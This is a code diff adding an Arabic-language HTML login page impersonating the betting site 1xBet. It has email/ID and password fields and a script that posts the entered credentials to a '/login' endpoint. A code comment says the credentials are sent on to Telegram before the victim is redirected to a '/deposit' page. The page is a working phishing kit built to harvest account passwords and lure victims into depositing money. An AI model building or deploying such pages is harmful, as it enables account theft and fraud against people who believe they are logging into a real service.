@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول - 1xBet</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f9;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+        .login-card {
+            background: white;
+            width: 100%;
+            max-width: 450px;
+            min-height: 100vh;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            padding: 15px;
+            background: white;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .header-title {
+            flex-grow: 1;
+            text-align: center;
+            font-weight: bold;
+            color: #333;
+            font-size: 18px;
+        }
+        .back-icon { font-size: 20px; cursor: pointer; color: #1a73e8; }
+        
+        .tabs {
+            display: flex;
+            background: white;
+            border-bottom: 1px solid #eee;
+        }
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 15px 5px;
+            font-size: 12px;
+            color: #757575;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .tab.active {
+            color: #1a73e8;
+            border-bottom: 3px solid #1a73e8;
+            font-weight: bold;
+        }
+
+        .form-container { padding: 30px 20px; }
+        
+        .input-group { margin-bottom: 20px; position: relative; }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #cfd8dc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background: #fafafa;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            background: white;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #82b541;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        .login-btn:active { background-color: #6d9a35; }
+
+        .footer-links {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 14px;
+            color: #1a73e8;
+        }
+        .footer-links div { margin-bottom: 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <div class="header">
+            <div class="back-icon">➔</div>
+            <div class="header-title">تسجيل الدخول</div>
+            <div style="width: 20px;"></div>
+        </div>
+
+        <div class="tabs">
+            <div class="tab">📧 بالبريد</div>
+            <div class="tab">💬 بنقرة واحدة</div>
+            <div class="tab active">📱 عبر الهاتف</div>
+            <div class="tab">👥 الشبكات</div>
+        </div>
+
+        <div class="form-container">
+            <div class="input-group">
+                <input type="text" id="u" placeholder="البريد الإلكتروني أو المعرف *" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="p" placeholder="كلمة المرور *" required>
+            </div>
+            
+            <button class="login-btn" onclick="sendData()">تسجيل الدخول</button>
+
+            <div class="footer-links">
+                <div>نسيت كلمة المرور؟</div>
+                <div style="color: #666;">ليس لديك حساب؟ <span style="color: #1a73e8;">تسجيل</span></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function sendData() {
+            const username = document.getElementById('u').value;
+            const password = document.getElementById('p').value;
+
+            if (!username || !password) {
+                alert("يرجى ملء جميع الحقول");
+                return;
+            }
+
+            // إظهار حالة تحميل بسيطة على الزر
+            const btn = document.querySelector('.login-btn');
+            btn.innerText = "جاري التحميل...";
+            btn.disabled = true;
+
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password
+                    })
+                });
+
+                if (response.ok) {
+                    // التحويل لصفحة الإيداع بعد نجاح الإرسال للتليجرام
+                    window.location.href = "/deposit";
+                } else {
+                    alert("خطأ في الخادم، حاول لاحقاً");
+                    btn.innerText = "تسجيل الدخول";
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert("فشل الاتصال بالسيرفر");
+                btn.innerText = "تسجيل الدخول";
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
